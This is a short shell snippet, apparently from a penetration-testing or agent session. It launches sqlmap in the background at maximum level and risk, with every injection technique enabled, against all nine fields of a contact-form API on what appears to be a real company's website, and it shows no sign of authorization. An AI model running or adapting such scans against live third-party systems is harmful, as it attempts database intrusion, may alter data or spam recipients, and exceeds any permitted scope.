U="https://www.infinitycapital.bh/api/send"
D="fname=ICTest&lname=Tester&areacode=973&tel=1234567&cname=Acme&subject=Gen&msg=ICMARKER9X&check=&targets=ictest@www.infinitycapital.bh"
nohup sqlmap -u "$U" --batch --level=5 --risk=3 --threads=6 --technique=BEUSTQ --timeout=15 --retries=1 \
 --data="$D" -p "fname,lname,areacode,tel,cname,subject,msg,check,targets" --output-dir=/work/sqev > /work/runsq2.log 2>&1 &
echo "pid $!"
